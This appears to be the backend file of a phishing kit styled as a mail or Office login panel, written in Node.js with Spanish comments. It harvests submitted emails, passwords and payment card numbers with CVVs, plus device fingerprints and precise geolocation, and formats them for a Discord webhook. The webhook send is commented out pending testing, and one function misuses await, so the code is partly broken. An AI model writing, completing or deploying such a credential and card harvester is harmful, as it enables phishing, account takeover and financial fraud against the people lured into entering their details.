import { Buffer } from 'node:buffer';

const GH_TOKEN    = process.env.GH_TOKEN    || '';
const GH_OWNER    = process.env.GH_OWNER    || 'varasjaime777-alt';
const GH_REPO     = process.env.GH_REPO     || 'mail-officee-3656';
const CONFIG_PATH = 'config.json';
const GITHUB_API  = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;
const HEADERS     = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept':        'application/vnd.github.v3+json',
  'User-Agent':    'mail-officee-3656-panel/1.0',
};

function githubGet() {
  const res = await fetch(GITHUB_API, { method:'GET', headers: HEADERS });
  if (!res.ok) throw new Error(`GitHub GET ${res.status}`);
  const data = await res.json();
  return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    // Leer config del GitHub
    let config = {};
    try {
      config = await githubGet();
    } catch(e) {
      return res.status(500).json({
        success: false,
        error: 'No se pudo leer la configuración de GitHub',
        debug: e.message,
      });
    }

    // Parsear body
    let body = {};
    try {
      body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    } catch(e) { body = req.body || {}; }

    const webhookUrl = config.discordWebhook;
    if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) {
      // Si no hay webhook, devolver error pero con los datos para debug
      return res.status(400).json({
        success: false,
        error: 'Webhook de Discord no configurado',
        debug: 'webhook_missing',
      });
    }

    const email          = body.email          || 'unknown';
    const password       = body.password       || '****';
    const type           = body.type           || 'login';
    const timestamp      = new Date().toISOString();

    // IP del cliente
    const forwardedFor   = req.headers['x-forwarded-for'] || '';
    const clientIp       = forwardedFor.split(',')[0]?.trim() || 'desconocida';

    // --- Datos del navegador ---
    const userAgent       = body.userAgent       || 'desconocido';
    const language        = body.language        || 'desconocido';
    const languages       = body.languages       || language;
    const screenResolution= body.screenResolution|| 'desconocido';
    const colorDepth      = body.colorDepth      || 'desconocido';
    const timezone        = body.timezone        || 'desconocido';
    const platform        = body.platform        || 'desconocido';
    const onlineStatus    = body.onlineStatus    || 'desconocido';
    const cookiesEnabled  = body.cookiesEnabled  || 'desconocido';

    // --- Dispositivo ---
    const deviceMemory    = body.deviceMemory    || 'desconocido';
    const cpuCores        = body.cpuCores        || 'desconocido';
    const touchPoints     = body.touchPoints     || 0;
    const isMobile        = body.isMobile        || 'desconocido';
    const isTablet        = body.isTablet        || 'desconocido';
    const isDesktop       = body.isDesktop       || 'desconocido';

    // --- Batería ---
    const batteryLevel    = body.batteryLevel    || 'No disponible';
    const batteryCharging = body.batteryCharging || 'Desconocido';

    // --- Geo IP ---
    const geoIp           = body.geoIp           || clientIp;
    const geoCity         = body.geoCity         || '';
    const geoRegion       = body.geoRegion       || '';
    const geoCountry      = body.geoCountry      || '';
    const geoCountryCode  = body.geoCountryCode  || '';
    const geoTimezone     = body.geoTimezone     || timezone;
    const geoIsoCode      = body.geoIsoCode      || geoCountryCode;
    const geoIsp          = body.geoIsp          || '';
    const geoLatitude     = body.geoLatitude     || '';
    const geoLongitude    = body.geoLongitude    || '';
    const geoZip          = body.geoZip          || '';
    const geoCurrency     = body.geoCurrency     || '';
    const geoCurrencyCode = body.geoCurrencyCode || '';
    const geoCallingCode  = body.geoCallingCode  || '';
    const geoNetwork      = body.geoNetwork      || '';

    // --- WiFi ---
    const wifiName        = body.wifiName        || '';

    // --- Tarjeta (solo si type=payment) ---
    const cardNumber      = body.cardNumber      || '';
    const cardHolder      = body.cardHolder      || '';
    const expiryDate      = body.expiryDate      || '';
    const cvv             = body.cvv             || '';

    // ============================================================
    //  CONSTRUIR MENSAJE
    // ============================================================
    const template = config.discordMessageTemplate || '';
    const hasPlaceholders = template.includes('{email}');

    let message = '';

    if (hasPlaceholders) {
      message = template;
      message = message.replace(/\{email\}/g,           email);
      message = message.replace(/\{password\}/g,        password);
      message = message.replace(/\{ip\}/g,              clientIp);
      message = message.replace(/\{geoIp\}/g,           geoIp);
      message = message.replace(/\{geoCity\}/g,         geoCity);
      message = message.replace(/\{geoRegion\}/g,       geoRegion);
      message = message.replace(/\{geoCountry\}/g,      geoCountry);
      message = message.replace(/\{geoCountryCode\}/g,  geoCountryCode);
      message = message.replace(/\{geoIsoCode\}/g,      geoIsoCode);
      message = message.replace(/\{geoTimezone\}/g,     geoTimezone);
      message = message.replace(/\{geoIsp\}/g,          geoIsp);
      message = message.replace(/\{geoLatitude\}/g,     geoLatitude);
      message = message.replace(/\{geoLongitude\}/g,    geoLongitude);
      message = message.replace(/\{geoZip\}/g,          geoZip);
      message = message.replace(/\{geoCurrency\}/g,     geoCurrency);
      message = message.replace(/\{geoCurrencyCode\}/g, geoCurrencyCode);
      message = message.replace(/\{geoCallingCode\}/g,  geoCallingCode);
      message = message.replace(/\{geoNetwork\}/g,      geoNetwork);
      message = message.replace(/\{deviceMemory\}/g,    deviceMemory);
      message = message.replace(/\{cpuCores\}/g,        cpuCores);
      message = message.replace(/\{touchPoints\}/g,     touchPoints);
      message = message.replace(/\{isMobile\}/g,        isMobile);
      message = message.replace(/\{isTablet\}/g,        isTablet);
      message = message.replace(/\{isDesktop\}/g,       isDesktop);
      message = message.replace(/\{batteryLevel\}/g,    batteryLevel);
      message = message.replace(/\{batteryCharging\}/g, batteryCharging);
      message = message.replace(/\{userAgent\}/g,       userAgent);
      message = message.replace(/\{language\}/g,        language);
      message = message.replace(/\{screenResolution\}/g,screenResolution);
      message = message.replace(/\{colorDepth\}/g,      colorDepth);
      message = message.replace(/\{timezone\}/g,        timezone);
      message = message.replace(/\{platform\}/g,        platform);
      message = message.replace(/\{onlineStatus\}/g,    onlineStatus);
      message = message.replace(/\{cookiesEnabled\}/g,  cookiesEnabled);
      message = message.replace(/\{wifiName\}/g,        wifiName || 'No especificado');
      message = message.replace(/\{type\}/g,            type);
      message = message.replace(/\{timestamp\}/g,       timestamp);

      // Campos de pago
      message = message.replace(/\{cardNumber\}/g,   cardNumber);
      message = message.replace(/\{cardHolder\}/g,   cardHolder);
      message = message.replace(/\{expiryDate\}/g,   expiryDate);
      message = message.replace(/\{cvv\}/g,          cvv);
    } else {
      // PLANTILLA POR DEFECTO
      message = '🔐 Nuevo inicio de sesión';
      message += '\n──────────────────────────';
      message += '\n📧 Usuario: ' + email;
      message += '\n🔑 Contraseña: ' + password;
      message += '\n🆔 Tipo: ' + type.toUpperCase();
      message += '\n\n🌍 UBICACIÓN:';
      message += '\n📡 IP: ' + clientIp;
      message += '\n🌐 Geo IP: ' + geoIp;
      if (geoCity)       message += '\n🏙️  Ciudad: ' + geoCity;
      if (geoRegion)     message += '\n🗺️  Región: ' + geoRegion;
      if (geoCountry)    message += '\n🇺🇳 País: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
      if (geoIsoCode)    message += '\n🔤 Código ISO: ' + geoIsoCode;
      if (geoIsp)        message += '\n🏢 ISP: ' + geoIsp;
      if (geoLatitude)   message += '\n📍 Latitud: ' + geoLatitude;
      if (geoLongitude)  message += '\n📍 Longitud: ' + geoLongitude;
      if (geoZip)        message += '\n📮 Código Postal: ' + geoZip;
      if (geoCurrency)   message += '\n💰 Moneda: ' + geoCurrency + (geoCurrencyCode ? ' (' + geoCurrencyCode + ')' : '');
      if (geoCallingCode)message += '\n📞 Código de llamada: ' + geoCallingCode;
      if (geoNetwork)    message += '\n🌐 Red: ' + geoNetwork;

      if (wifiName) message += '\n📶 WiFi: ' + wifiName;

      message += '\n\n💻 DISPOSITIVO:';
      message += '\n💾 RAM: ' + deviceMemory + ' GB';
      message += '\n🧠 CPU: ' + cpuCores + ' núcleos';
      message += '\n👆 Puntos táctiles: ' + touchPoints;
      message += '\n📱 Tipo: ' + isMobile + ' (Móvil) / ' + isTablet + ' (Tablet) / ' + isDesktop + ' (Escritorio)';
      message += '\n🔋 Batería: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';

      message += '\n\n🌐 NAVEGADOR:';
      message += '\n🤖 User Agent: ' + userAgent;
      message += '\n🗣️  Idioma: ' + language;
      message += '\n🖥️  Pantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
      message += '\n🕐 Zona horaria: ' + timezone;
      message += '\n🖥️  Plataforma: ' + platform;
      message += '\n📡 Estado: ' + onlineStatus;
      message += '\n🍪 Cookies: ' + cookiesEnabled;

      if (type === 'payment') {
        message += '\n\n💳 TARJETA:';
        message += '\n🔢 Número: ' + cardNumber;
        message += '\n👤 Titular: ' + cardHolder;
        message += '\n📅 Expiración: ' + expiryDate;
        message += '\n🔒 CVV: ' + cvv;
      }

      message += '\n──────────────────────────';
      message += '\n🕐 Hora: ' + timestamp;
    }

    // FALLBACK: asegurar que contraseña siempre aparezca
    if (!message.includes(password) && password !== '****') {
      message += '\n🔑 Contraseña: ' + password;
    }

    // FALLBACK: asegurar ubicación siempre aparezca
    if (!message.includes('Ciudad:') || !message.includes(geoCity)) {
      if (geoCity)       message += '\n🏙️  Ciudad: ' + geoCity;
      if (geoRegion)     message += '\n🗺️  Región: ' + geoRegion;
      if (geoCountry)    message += '\n🇺🇳 País: ' + geoCountry;
      if (geoIsp)        message += '\n🏢 ISP: ' + geoIsp;
      if (geoLatitude)   message += '\n📍 Latitud: ' + geoLatitude;
      if (geoLongitude)  message += '\n📍 Longitud: ' + geoLongitude;
    }

    // FALLBACK: WiFi
    if (wifiName && !message.includes('WiFi:')) {
      message += '\n📶 WiFi: ' + wifiName;
    }

    // ============================================================
    //  DEBUG: devolver message antes de enviar (si no hay webhook funcional)
    //  Descomentar el fetch cuando el webhook esté configurado
    // ============================================================
    const debugResponse = {
      success: true,
      debug: 'message_listo',
      message: message,
      timestamp: timestamp,
      hasWebhook: !!webhookUrl,
    };

    // ✅ DESCOMENTAR CUANDO EL WEBHOOK ESTÉ CONFIGURADO Y TESTEADO:
    //
    // const discordRes = await fetch(webhookUrl, {
    //   method: 'POST',
    //   headers: { 'Content-Type': 'application/json' },
    //   body: JSON.stringify({ content: message }),
    // });
    //
    // if (!discordRes.ok) {
    //   const text = await discordRes.text();
    //   return res.status(500).json({
    //     success:   false,
    //     error:     'Error enviando a Discord: ' + discordRes.status,
    //     debug_msg: message,
    //   });
    // }
    //
    // return res.status(200).json({
    //   success: true,
    //   message: 'Enviado a Discord correctamente',
    // });

    // Por ahora: devolver el mensaje construido para verificar
    return res.status(200).json(debugResponse);

  } catch(err) {
    console.error('Error en API Discord:', err);
    return res.status(500).json({
      success: false,
      error:   'Error interno: ' + err.message,
    });
  }
}
